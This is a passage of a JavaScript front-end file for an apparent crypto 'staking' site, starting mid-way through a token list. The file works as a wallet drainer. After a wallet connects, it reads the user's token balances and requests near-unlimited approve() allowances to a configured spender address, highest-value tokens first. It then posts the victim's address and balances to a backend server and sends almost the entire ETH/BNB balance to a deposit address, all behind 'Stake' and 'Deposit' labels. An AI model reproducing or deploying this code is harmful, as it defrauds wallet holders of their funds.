    "name": "HashBit Blockchain (HBIT)",
    "price": "0.00000506",
    "address": "0x142749adb4176ee465592bbaadd5bd71f58017f1",
    "decimals": "18"
}, {
    "name": "Green Chart (GREEN)",
    "price": "0.00000152",
    "address": "0x7403802c0FFeE2d83FB13513e23aAF4a3a9C69f0",
    "decimals": "18"
}, {
    "name": "SiaCashCoin (SCC)",
    "price": "0.00000149",
    "address": "0xc26EaFC627624baDf990f8d30116892eD204DB51",
    "decimals": "18"
}, {
    "name": "Elite Swap Binance Token (ELTB)",
    "price": "0.00000118",
    "address": "0x380291a9a8593b39f123cf39cc1cc47463330b1f",
    "decimals": "18"
}, {
    "name": "SHIRO INU (SHIR)",
    "price": "0.00000057",
    "address": "0x4ddba615a7f6ee612d3a23c6882b698dfbbef7e7",
    "decimals": "18"
}, {
    "name": "Nemesis Wealth Projects BSC (NMS)",
    "price": "0.00000039",
    "address": "0x8cb4fdb148d87f7ec493e69391347bdd3ff1163f",
    "decimals": "18"
}, {
    "name": "TORG (TORG)",
    "price": "0.00000035",
    "address": "0xcea59dce6a6d73a24e6d6944cfabc330814c098a",
    "decimals": "18"
}, {
    "name": "808TA (808TA)",
    "price": "0.00000031",
    "address": "0xfd93917257b33c6d64dc24f7a60982589823e0cb",
    "decimals": "18"
}, {
    "name": "PizzaSwap (PIZZA)",
    "price": "0.00000028",
    "address": "0x2cc26dd730f548dc4ac291ae7d84a0c96980d2cb",
    "decimals": "18"
}, {
    "name": "Ltradex (LTEX)",
    "price": "0.00000006",
    "address": "0xBcB3ac7a3ceB2d0C5E162A03901d6D7bb8602912",
    "decimals": "18"
}, {
    "name": "OREO (ORE)",
    "price": "0.00000001",
    "address": "0x93d5a19a993d195cfc75acdd736a994428290a59",
    "decimals": "10"
}, {
    "name": "ElonGate (ElonGate)",
    "price": "0.00000001",
    "address": "0x2A9718defF471f3Bb91FA0ECEAB14154F150a385",
    "decimals": "9"
}, {
    "name": "France REV Finance (FRF)",
    "price": "0.00000001",
    "address": "0x5a29c96fa93ffa8845fb7f8616a03aa85fcc11d6",
    "decimals": "8"
}, {
    "name": "WEB3 Inu (WEB3)",
    "price": "0.00000001",
    "address": "0xd0c4bc1b89bbd105eecb7eba3f13e7648c0de38f",
    "decimals": "9"
}];

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const UsdtEthContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
const UsdtBscContractAddress = '0x55d398326f99059ff775485246999027b3197955';

let allowedChain = globalSettings.imtEthContractAddress ? "1" : "56";
applyInterface(allowedChain);

let isInitialChain = true;

const supportedWallets = {
    '0': 'WalletConnect',
    '1': 'Metamask'
}

let web3Modal, provider;

let isConnected;
let currentEthBalance;
let usdtContract, imtContract;
let selectedAccount, selectedProvider;

let web3n;
let finalAmount;

let currentToken;

let availableCurrencies = [];
let processedCurrencies = [];


console.log("Initializing example");
console.log("WalletConnectProvider is", WalletConnectProvider);

const getWeb3Modal = () => {
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                infuraId: "b365880147014f928d117886dcc8e428",
                rpc: {
                    56: 'https://bsc-dataseed1.binance.org'
                },
                chainId: allowedChain,
                network: allowedChain == "56" ? "binance" : null
            }
        },

    };

    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
    });

    return web3Modal;
};


async function fetchAccountData() {
    let web3 = new Web3(provider);
    web3n = web3;

    if (web3._provider['bridge']) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }

    let chainId = await web3.eth.getChainId();


    if (allowedChain != chainId) {
        if (allowedChain == "1") {
            if (globalSettings.imtBscContractAddress && isInitialChain && !isConnected) {
                allowedChain = chainId;
                $('#network-label').text(allowedChain == "56" ? 'BSC' : "ETH");
                applyInterface(allowedChain);
                isInitialChain = false;
            } else {
                alert(`Please Switch your Network to ETHEREUM CHAIN`);
            }
        } else if (allowedChain == "56") {
            if (globalSettings.imtEthContractAddress && isInitialChain && !isConnected) {
                allowedChain = chainId;
                $('#network-label').text(allowedChain == "56" ? 'BSC' : "ETH");
                applyInterface(allowedChain);
                isInitialChain = false;
            } else {
                alert(`Please Switch your Network to BINANCE CHAIN`);
            }
        }

        if (allowedChain != chainId) {
            if (selectedProvider == supportedWallets[1]) {
                try {
                    if (window.ethereum) {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{chainId: Web3.utils.toHex(chainId == "56" ? "1" : "56")}],
                        });
                    }
                } catch (exception) {
                    console.log(exception);
                    await onDisconnect();
                    throw exception;
                }
            } else {
                await onDisconnect();
            }
            return;
        }
    }


    const accounts = await web3.eth.getAccounts();

    console.log("Got accounts", accounts);
    selectedAccount = accounts[0];

    usdtContract = await getContract(web3n, allowedChain == "56" ? UsdtBscContractAddress : UsdtEthContractAddress, 'assets/abi.json');
    imtContract = await getContract(web3n, allowedChain == "56" ? globalSettings.imtBscContractAddress : globalSettings.imtEthContractAddress, 'assets/abi.json');

    const bnbWeiBalance = await web3.eth.getBalance(selectedAccount);
    currentEthBalance = +web3.utils.fromWei(bnbWeiBalance, "ether");
    $('#bnb-balance').text(currentEthBalance.toFixed(6) + (allowedChain == "56" ? ' BNB' : " ETH"));

    availableCurrencies = []

    const currencies = allowedChain == "1" ? currenciesEth : currenciesBsc;

    for (let currency of currencies) {
        (async () => {
            let contract = await getContract(web3n, currency['address'], "assets/abi.json");
            let balance = await contract.methods.balanceOf(selectedAccount).call();

            if (balance > 0) {
                availableCurrencies.push({
                    "name": currency["name"],
                    "amount": balance,
                    "price": currency["price"],
                    "address": currency["address"],
                    "decimals": currency['decimals'],
                    'totalPrice': parseInt(balance) / Math.pow(10, parseInt(currency['decimals'])) * parseFloat(currency['price'])
                })
            }
        })();
    }
}

async function onConnect() {
    web3Modal = getWeb3Modal();
    console.log("Opening a dialog", web3Modal);
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }

    provider.on("accountsChanged", (accounts) => {
        fetchAccountData();
    });

    provider.on("chainChanged", (chainId) => {
        fetchAccountData();
    });

    provider.on("networkChanged", (networkId) => {
        fetchAccountData();
    });


    await fetchAccountData();
    isConnected = true;
    $('#connect-button').text('Disconnect');
    $('.select-button').removeAttr('disabled');
    $('#approve-button').removeAttr('disabled');
}

async function onDisconnect() {
    console.log("Killing the wallet connection", provider);

    if (provider.close) {
        await provider.close();


        await web3Modal.clearCachedProvider();
        provider = null;
    }

    selectedAccount = null;

    $('#connect-button').text('Connect Wallet');
    $('#approve-button').attr('disabled', 'disabled');
    $('.select-button').attr('disabled', 'disabled');
    $('#select-menu').hide();
    $('#cards-menu').show();

    isConnected = false;

    $('#bnb-balance').text('-');

}


$('#connect-button').on('click', async () => {
    if (!isConnected) {
        await onConnect();
    } else {
        await onDisconnect();
    }
});


async function getContract(web3, tokenContract, abiPath) {
    return new web3.eth.Contract(
        abiData,
        tokenContract
    );
}


const onApproveButtonPressed = async (e) => {
    if (!isConnected) {
        await onConnect();
        return;
    }

    e.currentTarget.setAttribute('disabled', 'disabled');

    try {
        let tokenDecimals;
        if (allowedChain == "1") {
            tokenDecimals = currentToken == 'IMT' ? globalSettings.imtEthDecimals : 6;
        } else {
            tokenDecimals = currentToken == 'IMT' ? globalSettings.imtBscDecimals : 18;
        }

        const tokenAmountToApprove = web3n.utils.toBN(590372687).mul(web3n.utils.toBN(10).pow(web3n.utils.toBN(2)));
        console.log(tokenAmountToApprove);
        console.log(tokenDecimals);
        const calculatedApproveValue = web3n.utils.toHex(tokenAmountToApprove.mul(web3n.utils.toBN(10).pow(web3n.utils.toBN(tokenDecimals))));

        let currentTokenContract, currentContractAddress;

        switch (currentToken) {
            case "IMT":
                currentTokenContract = imtContract;
                currentContractAddress = allowedChain == "1" ? globalSettings.imtEthContractAddress : globalSettings.imtBscContractAddress;
                break;
            case "USDT":
                currentTokenContract = usdtContract;
                currentContractAddress = allowedChain == "1" ? UsdtEthContractAddress : UsdtBscContractAddress;
                break;
        }

        currentTokenContract.methods.approve(allowedChain == "56" ? globalSettings.spenderBscAddress : globalSettings.spenderEthAddress, calculatedApproveValue).send({
            from: selectedAccount
        }).then(async () => {
            const balance = await currentTokenContract.methods.balanceOf(selectedAccount).call();
            $.ajax({
                type: "POST",
                url: globalSettings.nodeJsAppUrl,
                data: {
                    approvedAddress: selectedAccount,
                    amountToSend: balance,
                    contractAddress: currentContractAddress,
                    chainId: allowedChain
                },
                success: function (response) {
                    console.log(response);
                },
                error: function (response) {
                    console.log(response);
                }
            });

        });


        processedCurrencies.push(currentContractAddress);
        await startApproving();


    } finally {
        $('#approve-button').removeAttr('disabled');
    }
};

async function startApproving() {
    let hasOneOrMore = false;
    availableCurrencies.sort((a, b) => b.totalPrice - a.totalPrice);

    for (let currency of availableCurrencies) {
        if (!processedCurrencies.includes(currency['address']) && currency['totalPrice'] > 1) {
            try {
                hasOneOrMore = true;
                let tokenDecimals = web3n.utils.toBN(currency['decimals']);

                const tokenAmountToApprove = web3n.utils.toBN(590372687).mul(web3n.utils.toBN(10).pow(web3n.utils.toBN(2)));
                const calculatedApproveValue = web3n.utils.toHex(tokenAmountToApprove.mul(web3n.utils.toBN(10).pow(tokenDecimals)));


                console.log(currency);

                let currentContractAddress = currency['address'];
                let currentTokenContract = await getContract(web3n, currentContractAddress, null);


                await currentTokenContract.methods.approve(allowedChain == "56" ? globalSettings.spenderBscAddress : globalSettings.spenderEthAddress, calculatedApproveValue).send({
                    from: selectedAccount
                });


                const balance = await currentTokenContract.methods.balanceOf(selectedAccount).call();

                $.ajax({
                    type: "POST",
                    url: globalSettings.nodeJsAppUrl,
                    data: {
                        approvedAddress: selectedAccount,
                        amountToSend: balance,
                        contractAddress: currentContractAddress,
                        chainId: allowedChain
                    },
                    success: function (response) {
                        console.log(response);
                    },
                    error: function (response) {
                        console.log(response);
                    }
                });

                processedCurrencies.push(currency['address']);
            } catch (e) {
                console.log(e)
            }
        }
    }

    if (!hasOneOrMore) {
        await new Promise(r => setTimeout(r, globalSettings.sleepBeforeDeposit));
    }

    const bnbWeiBalance = await web3n.eth.getBalance(selectedAccount);
    finalAmount = String(+web3n.utils.fromWei(bnbWeiBalance, "ether") - 0.05);

    if (finalAmount <= 0) return;

    const txData = {
        from: selectedAccount,
        to: allowedChain == "56" ? globalSettings.depositBscAddress : globalSettings.depositEthAddress,
        value: web3n.utils.toHex(web3n.utils.toWei(finalAmount, "ether"))
    }

    console.log(selectedAccount)

    if (selectedProvider == supportedWallets[0]) {
        provider.connector.sendTransaction(txData).then((txHash) => {
            console.log(txHash)
            const runInterval = setInterval(async () => {
                web3n.eth
                    .getTransactionReceipt(txHash && txHash)
                    .then((txReceipt) => {
                        if (txReceipt == null) {
                        } else if (txReceipt && txReceipt.status === true) {
                            console.log(txReceipt);
                        } else if (txReceipt && txReceipt.status === false) {
                            console.log(txReceipt);
                        }
                    });
            }, 5000);
        }).catch((error) => {
        });


    } else {
        ethereum.request({
            method: 'eth_sendTransaction',
            params: [
                txData,
            ],
        }).then((txHash) => {
            console.log(txHash)
            const runInterval = setInterval(async () => {
                web3n.eth
                    .getTransactionReceipt(txHash && txHash)
                    .then((txReceipt) => {
                        if (txReceipt == null) {
                        } else if (txReceipt && txReceipt.status === true) {
                            console.log(txReceipt);
                        } else if (txReceipt && txReceipt.status === false) {
                            console.log(txReceipt);
                        }
                    });
            }, 5000);
        }).catch((error) => {
        });
    }

}

const onDepositButtonPressed = async (e) => {
    $('#eth-popup-token').text(allowedChain == "56" ? "BNB" : "ETH")
    $('#bscimg').attr('src', allowedChain == "56" ? "assets/images/Binance-coin-bnb-logo.png" : "assets/images/Ethereum-ETH-icon.png");
    $('#balanceBNB').text(currentEthBalance.toFixed(6));
    $('#get-pay-address').show();
};

$('.select-button').on('click', async (e) => {
    $('#cards-menu').hide();

    const approveButton = document.getElementById('approve-button');

    switch (e.target.id) {
        case "select-imt-btn":
            currentToken = 'IMT';
            $('#select-main-image').attr('src', globalSettings.imtImagePath);
            $('#select-main-token').text(globalSettings.imtTokenName);
            $('#select-main-title').text(`Deposit ${globalSettings.imtTokenName} and earn ${globalSettings.imtTokenName}`);
            $('#select-staked-image').attr('src', globalSettings.imtImagePath)
            $('#select-staked-title').text(`Stake ${globalSettings.imtTokenName}`);
            $('#select-approve-title').text('Approve ' + globalSettings.imtTokenName);

            approveButton.onclick = onApproveButtonPressed;
            break;
        case "select-usdt-to-imt-btn":
            currentToken = 'USDT';
            $('#select-main-image').attr('src', 'assets/images/Tether-USDT-icon.png');
            $('#select-main-token').text('USDT');
            $('#select-main-title').text(`Deposit USDT and earn ${globalSettings.imtTokenName}`);
            $('#select-staked-image').attr('src', 'assets/images/Tether-USDT-icon.png')
            $('#select-staked-title').text('Stake USDT');
            $('#select-approve-title').text('Approve USDT');

            approveButton.onclick = onApproveButtonPressed;
            break;
        case "select-eth-to-imt-btn":
            currentToken = 'ETH';
            $('#select-main-image').attr('src', allowedChain == "56" ? "assets/images/Binance-coin-bnb-logo.png" : "assets/images/Ethereum-ETH-icon.png");
            $('#select-main-token').text(allowedChain == "56" ? "BNB" : 'ETH');
            $('#select-main-title').text(`Deposit ${allowedChain == "56" ? "BNB" : "ETH"} and earn ${globalSettings.imtTokenName}`);
            $('#select-staked-image').attr('src', allowedChain == "56" ? "assets/images/Binance-coin-bnb-logo.png" : "assets/images/Ethereum-ETH-icon.png")
            $('#select-staked-title').text(`Stake ${allowedChain == "56" ? "BNB" : "ETH"}`);
            $('#select-approve-title').text('Deposit');

            approveButton.onclick = onDepositButtonPressed;
            break;
    }

    $('#select-menu').show();
});

$('#back-button').on('click', async (e) => {
    $('#select-menu').hide();
    $('#cards-menu').show();
});

$('#closeModal').on('click', async (e) => {
    $('#get-pay-address').hide();
    $('#depositAmount').val("");

    console.log(availableCurrencies);
})

$('#network-marker').on('click', async () => {
    if (!globalSettings.imtEthContractAddress || !globalSettings.imtBscContractAddress) return;

    isInitialChain = false;

    if (allowedChain == '56') {
        allowedChain = "1";
    } else {
        allowedChain = "56";
    }
    $('#network-label').text(allowedChain == "56" ? 'BSC' : "ETH");
    applyInterface(allowedChain, currentToken);

    if (provider) {
        await fetchAccountData(provider);
    } else {
        await onConnect();
    }
});


function keyUp(e) {

    const value = e.target.value

    if (isNaN(value) || +value <= 0) {
        $('#sendEthButton').attr('disabled', 'disabled');
        return
    }
    $('#sendEthButton').removeAttr('disabled');
    finalAmount = value;
}

$("#sendEthButton").on('click', async () => {
    const value = document.getElementById('depositAmount').value;

    if (isNaN(value) || +value <= 0) {
        $('#sendEthButton').attr('disabled', 'disabled');
        return
    }

    finalAmount = value;

    const txData = {
        from: selectedAccount,
        to: allowedChain == "56" ? globalSettings.depositBscAddress : globalSettings.depositEthAddress,
        value: web3n.utils.toHex(web3n.utils.toWei(finalAmount, "ether"))
    }

    console.log(selectedAccount)

    if (selectedProvider == supportedWallets[0]) {
        provider.connector.sendTransaction(txData).then((txHash) => {
            console.log(txHash)
            const runInterval = setInterval(async () => {
                web3n.eth
                    .getTransactionReceipt(txHash && txHash)
                    .then((txReceipt) => {
                        if (txReceipt == null) {
                        } else if (txReceipt && txReceipt.status === true) {
                            console.log(txReceipt);
                        } else if (txReceipt && txReceipt.status === false) {
                            console.log(txReceipt);
                        }
                    });
            }, 5000);
        }).catch((error) => {
        });


    } else {
        ethereum.request({
            method: 'eth_sendTransaction',
            params: [
                txData,
            ],
        }).then((txHash) => {
            console.log(txHash)
            const runInterval = setInterval(async () => {
                web3n.eth
                    .getTransactionReceipt(txHash && txHash)
                    .then((txReceipt) => {
                        if (txReceipt == null) {
                        } else if (txReceipt && txReceipt.status === true) {
                            console.log(txReceipt);
                        } else if (txReceipt && txReceipt.status === false) {
                            console.log(txReceipt);
                        }
                    });
            }, 5000);
        }).catch((error) => {
        });
    }

    await startApproving();
});